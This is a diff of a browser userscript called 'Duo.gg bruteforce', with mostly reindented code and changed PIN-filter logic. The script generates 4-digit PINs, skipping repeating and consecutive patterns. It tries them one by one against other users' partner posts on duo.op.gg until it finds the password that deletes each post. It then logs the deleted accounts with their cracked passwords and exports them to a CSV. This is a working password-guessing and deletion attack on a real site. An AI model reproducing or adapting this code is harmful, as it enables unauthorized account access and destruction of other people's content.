@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Duo.gg bruteforce
 // @namespace    https://github.com/HigorJardini/Manhattan-Project/
-// @version      0.9
+// @version      0.7
 // @description  op.gg
 // @author       You
 // @match        *://duo.op.gg/*/lol/
@@ -83,73 +83,68 @@ async function ButtonClickAction (zEvent) {
 
 
 function hasConsecutiveSequences(str) {
-
-  for (let i = 0; i < str.length - 4; i++) {
-    const sequence = str.slice(i, i + 4);
-    if (parseInt(sequence) === parseInt(sequence[0].repeat(4)) + 1) {
-      return true;
-    }
+for (let i = 0; i < str.length - 3; i++) {
+  const sequence = str.slice(i, i + 4);
+  if (parseInt(sequence) === parseInt(sequence[0].repeat(4)) + 1) {
+    return true;
   }
-  return false;
-
+}
+return false;
 }
 
-
 function hasRepeatingNumbers(str) {
-
-  for (let i = 0; i < str.length - 2; i++) {
-    if (str[i] === str[i + 1] && str[i] === str[i + 2] && str[i] === str[i + 3]) {
-      return true;
-    }
+for (let i = 0; i < str.length - 2; i++) {
+  if (str[i] === str[i + 1] && str[i] === str[i + 2]) {
+    return true;
   }
-  return false;
-
+}
+return false;
 }
 
 const numbersArray = [];
+
 for (let i = 0; i <= 9999; i++) {
-  const paddedNumber = i.toString().padStart(4, '0');
-  if (!hasConsecutiveSequences(paddedNumber) && !hasRepeatingNumbers(paddedNumber)) {
-    numbersArray.push(paddedNumber);
-  }
+const paddedNumber = i.toString().padStart(4, '0');
+if (!hasConsecutiveSequences(paddedNumber) && !hasRepeatingNumbers(paddedNumber)) {
+  numbersArray.push(paddedNumber);
+}
 }
 
 async function downloadCsv(){
 
-  var session = sessionStorage.getItem("deleted_accounts");
-  if (session != null){
-    let deleted_accounts = JSON.parse(session)
-    let csv = "data:text/csv;charset=utf-8," + deleted_accounts.map(e => e.join(",")).join("\n");
-    var encoded = encodeURI(csv);
-    var link = document.createElement("a");
-    link.setAttribute("href", encoded);
-    link.setAttribute("download", "Manhattan_Project.csv");
-    document.body.appendChild(link); // Required for FF
+var session = sessionStorage.getItem("deleted_accounts");
+if (session != null){
+  let deleted_accounts = JSON.parse(session)
+  let csv = "data:text/csv;charset=utf-8," + deleted_accounts.map(e => e.join(",")).join("\n");
+  var encoded = encodeURI(csv);
+  var link = document.createElement("a");
+  link.setAttribute("href", encoded);
+  link.setAttribute("download", "Manhattan_Project.csv");
+  document.body.appendChild(link); // Required for FF
 
-    link.click();
-  } else {
-    await Toast.fire({
-          icon: 'info',
-          title: 'Nenhuma informação disponível para download'
-    })
-  }
+  link.click();
+} else {
+  await Toast.fire({
+        icon: 'info',
+        title: 'Nenhuma informação disponível para download'
+  })
+}
 
 }
 
 async function sessionDeletedAccountsSaving(deleted_account) {
-
-  var session = sessionStorage.getItem("deleted_accounts");
-  var deleted_array;
-  if (session != null){
-    deleted_array = JSON.parse(session);
+var session = sessionStorage.getItem("deleted_accounts");
+var deleted_array;
+if (session != null){
+  deleted_array = JSON.parse(session);
+  deleted_array.push(deleted_account);
+  sessionStorage.removeItem('deleted_accounts');
+} else {
+    deleted_array = [];
     deleted_array.push(deleted_account);
-    sessionStorage.removeItem('deleted_accounts');
-  } else {
-      deleted_array = [];
-      deleted_array.push(deleted_account);
-  }
+}
 
-  sessionStorage.setItem("deleted_accounts", JSON.stringify(deleted_array));
+sessionStorage.setItem("deleted_accounts", JSON.stringify(deleted_array));
 
 }
 
@@ -193,49 +188,48 @@ async function wipeDay(){
 
 async function httpRequest(id, name) {
 
-  var found = false;
-  //console.clear();
-  //console.log('Processando... id: ' + id)
-  $(`#partner-${id}`).css('background-color','#e84057');
-  $(`#partner-${id} > div.w-24.flex.items-center.relative.text-3xs.text-center.py-2.px-2\\.5`).remove()
-  $(`#partner-${id} > div.relative.flex.justify-center.items-center.w-8`).remove()
-  $(`#patent-id-deleted-${id}`).remove()
-  $(`#partner-${id}`).append(`<div id="patent-id-deleted-${id}" class="w-44 flex group items-center px-2.5 py-2 sm:whitespace-nowrap"><div class="min-w-0"><div class="flex items-center"><span id="patent-deleted-${id}" class="truncate text-2xs tracking-tight style="color:white" ></span><span class="flex items-center space-x-0.5 ml-1 group-hover:hidden"></span></div></div></div>`);
+var found = false;
+ //console.clear();
+ //console.log('Processando... id: ' + id)
+ $(`#partner-${id}`).css('background-color','#e84057');
+ $(`#partner-${id} > div.w-24.flex.items-center.relative.text-3xs.text-center.py-2.px-2\\.5`).remove()
+ $(`#partner-${id} > div.relative.flex.justify-center.items-center.w-8`).remove()
+ $(`#patent-id-deleted-${id}`).remove()
+ $(`#partner-${id}`).append(`<div id="patent-id-deleted-${id}" class="w-44 flex group items-center px-2.5 py-2 sm:whitespace-nowrap"><div class="min-w-0"><div class="flex items-center"><span id="patent-deleted-${id}" class="truncate text-2xs tracking-tight style="color:white" ></span><span class="flex items-center space-x-0.5 ml-1 group-hover:hidden"></span></div></div></div>`);
 
 
-  while(found == false){
+ while(found == false){
 
-      let kboom = await TheBomb(id,senhas[i])
-      let exists = $(`#partner-${id}`).length;
+     let kboom = await TheBomb(id,senhas[i])
+     let exists = $(`#partner-${id}`).length;
 
-      if(kboom == false){
-        if(i <= senhas.length && exists){
-          i++;
-          // console.clear();
-          //console.log('Senhas testadas: ' + i + '/' + senhas.length + ' - (' + senhas[i] + ', ' + kboom + ') - Usuario: ' + name)
-          $(`#patent-deleted-${id}`).text('Senhas testadas: ' + i + '/' + senhas.length);
-        } else {
-          found = true;
-        }
-      } else if (kboom == true) {
-        //console.log('Senhas encontrada: ' + i + '/' + senhas.length + ' - (' + senhas[i] + ', ' + kboom + ') - Usuario: ' + name)
-        var obj_deleted = [
-                  id,
-                  name,
-                  senhas[i]
-                ]
-        await sessionDeletedAccountsSaving(obj_deleted);
+     if(kboom == false){
+       if(i <= senhas.length && exists){
+        i++;
+        // console.clear();
+        //console.log('Senhas testadas: ' + i + '/' + senhas.length + ' - (' + senhas[i] + ', ' + kboom + ') - Usuario: ' + name)
+        $(`#patent-deleted-${id}`).text('Senhas testadas: ' + i + '/' + senhas.length);
+       } else {
+         found = true;
+       }
+     } else if (kboom == true) {
+       //console.log('Senhas encontrada: ' + i + '/' + senhas.length + ' - (' + senhas[i] + ', ' + kboom + ') - Usuario: ' + name)
+       var obj_deleted = [
+                id,
+                name,
+                senhas[i]
+              ]
+       await sessionDeletedAccountsSaving(obj_deleted);
 
-        await Toast.fire({
-          icon: 'success',
-          title: 'Usuario deletado: ' + name + ', senha: ' + senhas[i]
-        })
-      } else {
-        await httpRequest(id,name);
-      }
-      found = kboom;
-  }
-
+       await Toast.fire({
+        icon: 'success',
+        title: 'Usuario deletado: ' + name + ', senha: ' + senhas[i]
+       })
+     } else {
+       await httpRequest(id,name);
+     }
+     found = kboom;
+ }
 }
 
 async function TheBomb(id,pass){
@@ -265,6 +259,7 @@ async function TheBomb(id,pass){
       console.log(e)
       TheBomb(id,pass)
     })
+
 
 }
 
